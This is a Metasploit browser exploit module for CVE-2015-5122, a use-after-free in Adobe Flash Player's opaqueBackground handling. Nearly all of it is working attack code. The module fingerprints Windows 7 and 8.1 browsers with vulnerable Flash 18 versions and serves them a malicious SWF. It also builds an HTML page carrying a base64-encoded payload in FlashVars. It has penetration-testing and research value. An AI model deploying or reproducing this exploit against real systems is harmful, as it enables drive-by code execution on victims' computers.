# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;                => &#039;Adobe Flash opaqueBackground Use After Free&#039;,
      &#039;Description&#039;         => %q{
        This module exploits an use after free on Adobe Flash Player. The vulnerability,
        discovered by Hacking Team and made public on its July 2015 data leak, was
        described as an Use After Free while handling the opaqueBackground property
        7 setter of the flash.display.DisplayObject class. This module is an early release
        tested on:

        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.203,
        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.194,
        Windows 7 SP1 (32-bit), IE9 and Adobe Flash Flash 18.0.0.203,
        Windows 7 SP1 (32-bit), Firefox + Adobe Flash 18.0.0.194,
        windows 8.1, Firefox and Adobe Flash 18.0.0.203,
        Windows 8.1, Firefox and Adobe Flash 18.0.0.160, and
        Windows 8.1, Firefox and Adobe Flash 18.0.0.194
      },
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              =>
        [
          &#039;Unknown&#039;,      # Vulnerability discovered on HackingTeam info leak
          &#039;juan vazquez&#039;, # Ported to Msf
          &#039;sinn3r&#039;        # Testing and some editing
        ],
      &#039;References&#039;          =>
        [
          [&#039;CVE&#039;, &#039;2015-5122&#039;],
          [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2015/07/cve-2015-5122_-_seco.html&#039;]
        ],
      &#039;Payload&#039;             =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;            => [&#039;win&#039;],
      &#039;Arch&#039;                => [ARCH_X86],
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script|headers/i,
          :arch    => ARCH_X86,
          :os_name => lambda do |os|
            os =~ OperatingSystems::Match::WINDOWS_7 ||
            os =~ OperatingSystems::Match::WINDOWS_81
          end,
          :ua_name => lambda do |ua|
            case target.name
            when &#039;Windows&#039;
              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF
            end

            false
          end,
          :flash   => lambda do |ver|
            case target.name
            when &#039;Windows&#039;
              return true if ver =~ /^18\./ && Gem::Version.new(ver) <= Gem::Version.new(&#039;18.0.0.203&#039;)
            end

            false
          end
        },
      &#039;Targets&#039;             =>
        [
          [ &#039;Windows&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;
            }
          ]
        ],
      &#039;Privileged&#039;          => false,
      &#039;DisclosureDate&#039;      => &#039;Jul 06 2015&#039;,
      &#039;DefaultTarget&#039;       => 0))
  end

  def exploit
    @swf = create_swf

    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if target_info[:os_name] =~ OperatingSystems::Match::WINDOWS_81 && target_info[:ua_ver] == &#039;11.0&#039;
      print_warning("Target setup not supported")
      send_not_found(cli)
      return
    end

    if request.uri =~ /\.swf$/
      print_status(&#039;Sending SWF...&#039;)
      send_response(cli, @swf, {&#039;Content-Type&#039;=>&#039;application/x-shockwave-flash&#039;, &#039;Cache-Control&#039; => &#039;no-cache, no-store&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;})
      return
    end

    print_status(&#039;Sending HTML...&#039;)
    send_exploit_html(cli, exploit_template(cli, target_info), {&#039;Pragma&#039; => &#039;no-cache&#039;})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    b64_payload = Rex::Text.encode_base64(target_payload)
    os_name = target_info[:os_name]

    if target.name =~ /Windows/
      platform_id = &#039;win&#039;
    end

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-5122&#039;, &#039;msf.swf&#039;)
    swf =  ::File.open(path, &#039;rb&#039;) { |f| swf = f.read }

    swf
  end
end

